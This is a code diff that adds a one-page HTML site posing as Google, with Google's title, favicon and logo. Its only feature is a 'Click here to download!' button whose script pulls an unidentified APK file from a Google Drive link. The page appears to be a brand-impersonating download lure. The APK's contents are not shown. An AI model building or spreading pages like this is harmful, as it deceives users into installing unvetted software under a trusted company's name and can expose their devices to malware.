@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Google</title>
+
+  <!-- Favicon -->
+  <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSTLNyHEp8ERADDJDy5wXQLoV_Lj0YTmv6eA&s" type="image/png">
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #f8f9fa;
+    }
+    .logo {
+      margin-bottom: 40px;
+    }
+    .logo img {
+      width: 272px; /* Same as google.com homepage */
+    }
+    .download-button {
+      padding: 15px 30px;
+      font-size: 18px;
+      border: none;
+      border-radius: 5px;
+      background-color: #1a73e8;
+      color: white;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .download-button:hover {
+      background-color: #0c5cd8;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/640px-Google_2015_logo.svg.png" alt="Google Logo">
+  </div>
+
+  <button class="download-button" onclick="downloadApk()">Click here to download!</button>
+
+  <script>
+    function downloadApk() {
+      const fileUrl = "https://drive.usercontent.google.com/download?id=1UHs56Uc_d4a3cAuZe2E7DyjTOswCysKG&export=download&authuser=0"; // Replace with your file URL
+      const link = document.createElement("a");
+      link.href = fileUrl;
+      link.download = fileUrl.split("/").pop();
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+  </script>
+</body>
+</html>
